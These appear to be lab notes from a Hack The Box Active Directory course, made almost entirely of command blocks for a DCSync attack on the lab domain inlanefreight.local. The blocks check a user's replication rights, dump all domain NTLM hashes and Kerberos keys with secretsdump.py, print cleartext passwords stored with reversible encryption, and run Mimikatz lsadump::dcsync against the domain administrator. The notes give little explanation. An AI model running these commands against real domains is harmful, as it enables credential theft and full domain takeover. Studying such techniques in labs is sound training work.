#### Using Get-ObjectAcl to Check adunn's Replication Rights
```powershell-session
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
```shell-session
Tachipy@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```
#### Listing Hashes, Kerberos Keys, and Cleartext Passwords
```shell-session
Tachipy@htb[/htb]$ ls inlanefreight_hashes*
```
#### Enumerating Further using Get-ADUser

  Enumerating Further using Get-ADUser

```powershell-session
PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```
#### Checking for Reversible Encryption Option using Get-DomainUser
```powershell-session
PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
#### Displaying the Decrypted Password
```shell-session
Tachipy@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
```
#### Using runas.exe

  Using runas.exe

```cmd-session
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
Enter the password for INLANEFREIGHT\adunn:
Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
```
#### Performing the Attack with Mimikatz

  Performing the Attack with Mimikatz

```powershell-session
PS C:\htb> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```